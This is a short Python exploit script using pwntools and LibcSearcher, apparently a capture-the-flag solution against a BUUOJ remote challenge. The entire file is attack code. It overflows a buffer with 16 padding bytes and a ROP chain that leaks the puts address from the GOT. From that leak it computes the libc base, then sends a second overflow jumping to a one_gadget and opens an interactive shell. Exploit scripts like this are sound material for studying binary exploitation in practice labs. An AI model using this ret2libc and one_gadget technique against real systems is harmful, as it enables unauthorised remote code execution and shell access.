from LibcSearcher import *
from pwn import *

context.arch = 'i386'
elf = ELF("./pwn")
r = remote("node3.buuoj.cn", 26172)
one_gadget_addr = 0x3a80c
r.recvline()
r.sendline('I' * 16 + flat([elf.plt["puts"], 0x8049091, elf.got["puts"]]))
r.recvline()
puts_addr = u32(r.recv(4))
r.recvline()
libc = LibcSearcher("puts", puts_addr)
libc_base = puts_addr - libc.dump("puts")
system_addr = libc_base + libc.dump("system")
bin_sh_addr = libc_base + libc.dump("str_bin_sh")
r.recvline()
r.sendline('I' * 16 + flat([libc_base + one_gadget_addr]))
r.recvline()
r.interactive()
